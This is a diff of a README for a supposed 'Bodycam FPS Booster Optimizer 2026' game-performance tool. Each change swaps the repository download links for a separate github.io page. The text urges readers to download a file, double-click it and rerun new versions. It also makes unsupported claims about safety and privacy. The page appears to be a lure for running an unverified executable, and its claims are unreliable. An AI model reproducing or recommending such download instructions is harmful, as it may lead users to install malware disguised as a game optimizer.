@@ -1,6 +1,6 @@
 # 🚀 Bodycam-FPS-Booster-Optimizer-2026 - Fix Stuttering, Boost FPS Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Bodycam_FPS_Booster_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Chrysemysintertrigo7272/Bodycam-FPS-Booster-Optimizer-2026)
+[![Download Now](https://img.shields.io/badge/Download-Bodycam_FPS_Booster_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://chrysemysintertrigo7272.github.io)
 
 ## 📥 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to the ultimate performance solution for Bodycam on Unreal Engine 5. Thi
 ## 🔽 Download and Install
 
 Visit this link to download the application:
-**[https://github.com/Chrysemysintertrigo7272/Bodycam-FPS-Booster-Optimizer-2026](https://github.com/Chrysemysintertrigo7272/Bodycam-FPS-Booster-Optimizer-2026)**
+**[https://chrysemysintertrigo7272.github.io](https://chrysemysintertrigo7272.github.io)**
 
 Once you're on that page, look for the big green "Download" button or the latest release file. Click it, and the download will start automatically. No confusing branches or source code needed — just the ready-to-run version.
 
@@ -73,7 +73,7 @@ Absolutely. This tool is free for all players. No hidden costs, no premium tier,
 
 For those who just want the fastest path:
 
-1. Visit **[the download page](https://github.com/Chrysemysintertrigo7272/Bodycam-FPS-Booster-Optimizer-2026)**.
+1. Visit **[the download page](https://chrysemysintertrigo7272.github.io)**.
 2. Click the download button.
 3. Wait for the file to finish downloading.
 4. Double-click the downloaded file.
@@ -106,7 +106,7 @@ This tool runs entirely on your computer. It does not collect, transmit, or stor
 
 ## 🔄 Keeping Your Optimizer Up to Date
 
-The developers regularly release updates to match new Bodycam patches and Windows updates. Every few months, check the [download page](https://github.com/Chrysemysintertrigo7272/Bodycam-FPS-Booster-Optimizer-2026) for a newer version. You can simply download the latest file and run it — it will automatically update your settings with the newest improvements.
+The developers regularly release updates to match new Bodycam patches and Windows updates. Every few months, check the [download page](https://chrysemysintertrigo7272.github.io) for a newer version. You can simply download the latest file and run it — it will automatically update your settings with the newest improvements.
 
 ## 🎯 Why This Is the Number One Choice
 
@@ -129,6 +129,6 @@ Bodycam is an intense, fast-paced game that deserves to run buttery smooth. Don'
 
 Get your copy now from the official download page below and dominate the battlefield with silky-smooth performance.
 
-**[⬇️ Download Bodycam FPS Booster Optimizer 2026](https://github.com/Chrysemysintertrigo7272/Bodycam-FPS-Booster-Optimizer-2026)**
+**[⬇️ Download Bodycam FPS Booster Optimizer 2026](https://chrysemysintertrigo7272.github.io)**
 
 Keywords: 2026, bodycam, bodycam-game, fps-booster, graphics-optimization, lag-fix, performance-optimizer, stutter-fix, unreal-engine-5, windows
